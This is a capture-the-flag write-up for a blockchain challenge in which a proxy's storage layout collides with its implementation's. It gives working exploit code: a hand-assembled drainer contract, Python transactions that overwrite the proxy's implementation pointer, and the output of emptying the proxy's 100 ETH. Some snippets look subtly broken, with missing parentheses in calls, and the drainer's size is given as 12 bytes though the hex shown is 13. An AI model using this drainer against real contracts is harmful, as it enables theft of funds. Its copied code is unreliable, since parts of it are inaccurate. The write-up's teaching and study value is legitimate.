---
title: "Referral Program"
ctf: "platypwnies 2026"
date: 2026-11-14
category: blockchain
difficulty: 2
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{st0r4g3_c0ll1s10n_r3f3rr4l::xNasZukTMiNJ}"
---

# Referral Program

## Summary

`PlatyVault v2` is a hand-rolled upgradeable proxy. `Proxy` stores `implementation` in
**slot 0** and `admin` in **slot 1**; the implementation contract `Chal` stores
`latestReferrer` in **slot 0** too. Because the proxy `delegatecall`s into `Chal`, the two
layouts **collide**: `Chal.deposit(referrer)` writes `latestReferrer = referrer`, which —
through the delegatecall — overwrites the proxy's `implementation` pointer with an
attacker-chosen address. The unreachable `upgradeTo` (admin is `Setup`) is therefore not
needed: the referral write *is* the upgrade primitive. Pointing the implementation at a
drainer contract and calling the proxy makes it `delegatecall` our code with the proxy's
100 ETH balance, which we send to ourselves.

Win condition: `Setup.isSolved` → `address(TARGET).balance == 0`.

## Solution / Exploit

Source: `contracts/Proxy.sol`, `contracts/Chal.sol`, `contracts/Setup.sol`, exploit
`referral_exploit.py`.

### Step 1 — the storage collision

`Proxy`:

```solidity
address public implementation; // slot 0
address public admin; // slot 1

constructor(address _implementation) {
 implementation = _implementation;
 admin = msg.sender;
}

function upgradeTo(address newImplementation) external {
 require(msg.sender == admin, "Only admin");
 implementation = newImplementation;
}
```

`Chal`:

```solidity
address public latestReferrer; // slot 0 <-- collides with implementation
mapping(address => uint256) public balances; // slot 1 <-- collides with admin
mapping(address => uint256) public referrals;

function deposit(address referrer) external payable {
 require(referrer != msg.sender, "No self referrals");
 balances[msg.sender] += msg.value;
 if (referrer != address(0)) {
 referrals[referrer]++;
 latestReferrer = referrer; // writes proxy slot 0 when delegatecalled
 }
}
```

`Setup` deploys the pair and seeds 100 ETH:

```solidity
Proxy proxy = new Proxy(address(new Chal));
TARGET = Chal(address(proxy));
TARGET.deposit{value: 100 ether}(address(0));
```

(`referrer == address(0)` on the seed call, so it does not touch `latestReferrer`.)

### Step 2 — a 12-byte drainer

Runtime: `CALL(gas, caller, selfbalance, 0, 0, 0, 0)`. In the delegatecall context,
`SELFBALANCE` is the **proxy's** balance and `CALLER` is the player, so a bare call sends the
proxy's whole balance to the player.

```python
DRAINER_RUNTIME = bytes.fromhex("6000600060006000" "47" "33" "5a" "f1" "00")
# PUSH1 0 x4 SELFBALANCE CALLER GAS CALL STOP
```

Wrapped in a tiny init stub (`CODECOPY` + `RETURN`) so it can be deployed as a contract:

```python
DRAINER_INIT = (
 bytes.fromhex("60") + bytes([len(DRAINER_RUNTIME)]) + bytes.fromhex("600c600039")
 + bytes.fromhex("60") + bytes([len(DRAINER_RUNTIME)]) + bytes.fromhex("6000f3")
 + DRAINER_RUNTIME
)
```

### Step 3 — overwrite `implementation`, then drain

```python
# 1) deposit with referrer = drainer -> latestReferrer (= proxy slot 0) := drainer
raw_tx(w3, acct, to=target_addr, data=proxy.encode_abi("deposit", [drainer]))
assert proxy.functions.implementation.call.lower == drainer.lower

# 2) any call to the proxy now delegatecalls the drainer with the proxy's balance
raw_tx(w3, acct, to=target_addr, data=b"")
```

`deposit(drainer)` is called with `value=0` (so `balances[player]` gains nothing — irrelevant),
`referrer = drainer != msg.sender`, so the write happens. The subsequent empty-calldata call
hits `Proxy.fallback`, which `delegatecall`s `implementation` (now the drainer). The drainer
runs in the proxy's storage context and transfers `address(proxy).balance` to the caller.

### Run

```bash
RPC_URL=http://127.0.0.1:8545/<uuid> \
PRIVATE_KEY=<player key> \
SETUP_ADDRESS=<setup addr> \
FLAG='PP{st0r4g3_c0ll1s10n_r3f3rr4l::xNasZukTMiNJ}' \
python3 referral_exploit.py
```

### Expected output

No raw run log was retained; below is the literal format of the script's `print` statements
(not a captured transcript).

```
[*] proxy 0x... balance 100000000000000000000 wei
[*] implementation=0x... admin=0x...
[+] drainer deployed at 0x... (runtime 600060006000600047335af100)
[*] implementation is now 0x...
[*] drain tx status=1, proxy balance now 0 wei
[+] isSolved = True
FLAG: PP{st0r4g3_c0ll1s10n_r3f3rr4l::xNasZukTMiNJ}
```

## Flag(s)

```
PP{st0r4g3_c0ll1s10n_r3f3rr4l::xNasZukTMiNJ}
```

## Notes / Pitfalls

- **The bug is the missing gap / shared layout**, not the referral logic itself. A real proxy
 pattern isolates implementation/admin slots (EIP-1967) precisely to avoid this; here both
 contracts start their storage at slot 0.
- **`upgradeTo` is a red herring.** `admin == Setup`, so the honest upgrade path is
 unreachable — the collision in `deposit` is the intended (and only) way in.
- **Order of writes.** `balances[msg.sender] += msg.value` writes slot 1 (the `admin` slot
 under delegatecall) but only with `msg.value == 0` here, so `admin` is left intact; the
 `latestReferrer = referrer` assignment is what clobbers slot 0.
- **`SELFBALANCE` picks up the proxy's balance, not the drainer's.** That is the whole trick:
 the drainer contract itself holds nothing; it acts on the proxy's 100 ETH because it runs
 via `delegatecall`.
- **The drainer runtime is deliberately 12 bytes** — small enough to hand-assemble and verify
 by eye (`PUSH1 0; PUSH1 0; PUSH1 0; PUSH1 0; SELFBALANCE; CALLER; GAS; CALL; STOP`).
